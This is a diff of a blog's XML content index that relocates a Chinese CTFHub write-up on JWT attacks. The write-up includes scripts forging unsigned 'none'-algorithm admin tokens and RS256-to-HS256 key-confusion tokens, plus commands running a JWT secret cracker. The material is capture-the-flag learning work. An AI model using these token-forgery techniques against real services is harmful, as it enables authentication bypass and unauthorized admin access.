+encodeHeader <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>encodeHBytes<span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span>
+
+<span class="token comment"># Creating encoded payload</span>
+encodePBytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+encodePayload <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>encodePBytes<span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span>
+
+<span class="token comment"># Concatenating header and payload</span>
+token <span class="token operator">=</span> <span class="token punctuation">(</span>encodeHeader <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> encodePayload<span class="token punctuation">)</span>
+
+<span class="token comment"># Creating signature</span>
+sig <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>token <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> sig<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>运行后把token返回去验证</p>
+<p>成功</p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254094160-55.png" alt="请添加图片描述"><br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254096594-58.png" alt="请添加图片描述"></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>jwt</tag>
+        <tag>json web token</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hackthebox合集</title>
     <url>/2023/07/htb/</url>
     <content><![CDATA[<p>共做出三道题，前两道题wp正在补，但现在又有点想转去做vulnhub</p>
@@ -893,104 +991,6 @@ if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
         <tag>ctfhub</tag>
         <tag>linux</tag>
         <tag>动态加载</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctfhub-jwt</title>
-    <url>/2023/07/jwt/</url>
-    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>题目附件：<a href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob">jwt基础知识</a></p>
-<p>flag在下面</p>
-<p>需要了解一下jwt组成部分</p>
-<h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><p>随便输个</p>
-<p>进去查消息头</p>
-<p>然后在</p>
-<p><a href="https://jwt.io/">jwt.io</a></p>
-<p>decode	一共两部分ag是另一半<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254077114-40.png" alt="请添加图片描述"></p>
-<h1 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt
-algorithm<span class="token operator">=</span><span class="token string">"none"</span>
-payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
-  <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
-  <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
-  <span class="token string">"role"</span><span class="token punctuation">:</span><span class="token string">"admin"</span>
-  <span class="token punctuation">&#125;</span>
-key <span class="token operator">=</span> <span class="token string">""</span>
-encoded <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>key<span class="token punctuation">,</span>algorithm<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>jwt的签名可以为无</p>
-<blockquote>
-<p>今天写这个脚本的时候命名为jwt.py</p>
-<p>结果报错 但是系统环境运行正常</p>
-<p>才知道是文件名的事</p>
-<p>import jwt 他先自己引用自己了</p>
-</blockquote>
-<p>抓包</p>
-<p>把cookie里的token改为这脚本的运行结果</p>
-<h1 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h1><p>需要用到<a href="https://github.com/brendan-rius/c-jwt-cracker">jwt-cracker</a></p>
-<p>依次执行即可</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/brendan-rius/c-jwt-cracker
-./c-jwt-cracker
-<span class="token function">make</span>
-./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.w4i8KWRWmY_xTYtRnFZnp5vLIxPG2abCly6lW6QxTKs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>然后得出该jwt密钥</p>
-<p>然后放之前那个网站</p>
-<p>改role为admin</p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254081515-43.png" alt="请添加图片描述"></p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254083805-46.png" alt="请添加图片描述">返回提交token<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254086176-49.png" alt="请添加图片描述"></p>
-<h1 id="修改签名算法"><a href="#修改签名算法" class="headerlink" title="修改签名算法"></a>修改签名算法</h1><p>把cookie清空后提交用户名密码</p>
-<p>得到一串jwt</p>
-<p>丢进<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254091115-52.png" alt="请添加图片描述"><br>发现是RS256编码（不对称式编码)</p>
-<p>需要改为对称式编码</p>
-<p>如HS256</p>
-<p>题目中给了public key</p>
-<p>用PUBLIC_KEY采用HS256进行加密payload构造token</p>
-<p>借用<a href="https://blog.csdn.net/loseheart157">大神h0ld1rs</a>的脚本</p>
-<blockquote>
-<p>无签名那段脚本</p>
-<p>是勉勉强强写出来的</p>
-<p>这题就先用大神的脚本吧</p>
-<p>我太菜了</p>
-</blockquote>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=GBK</span>
-<span class="token keyword">import</span> hmac
-<span class="token keyword">import</span> hashlib
-<span class="token keyword">import</span> base64
-
-<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'publickey.pem'</span><span class="token punctuation">)</span><span class="token comment">#需要将文中的publickey下载	与脚本同目录</span>
-key <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-<span class="token comment"># Paste your header and payload here</span>
-header <span class="token operator">=</span> <span class="token string">'&#123;"typ": "JWT", "alg": "HS256"&#125;'</span>
-payload <span class="token operator">=</span> <span class="token string">'&#123;"username": "admin", "role": "admin"&#125;'</span>
-
-<span class="token comment"># Creating encoded header</span>
-encodeHBytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>header<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-encodeHeader <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>encodeHBytes<span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span>
-
-<span class="token comment"># Creating encoded payload</span>
-encodePBytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-encodePayload <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>encodePBytes<span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span>
-
-<span class="token comment"># Concatenating header and payload</span>
-token <span class="token operator">=</span> <span class="token punctuation">(</span>encodeHeader <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> encodePayload<span class="token punctuation">)</span>
-
-<span class="token comment"># Creating signature</span>
-sig <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span>
-
-<span class="token keyword">print</span><span class="token punctuation">(</span>token <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> sig<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>运行后把token返回去验证</p>
-<p>成功</p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254094160-55.png" alt="请添加图片描述"><br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254096594-58.png" alt="请添加图片描述"></p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>jwt</tag>
-        <tag>json web token</tag>
       </tags>
   </entry>
   <entry>
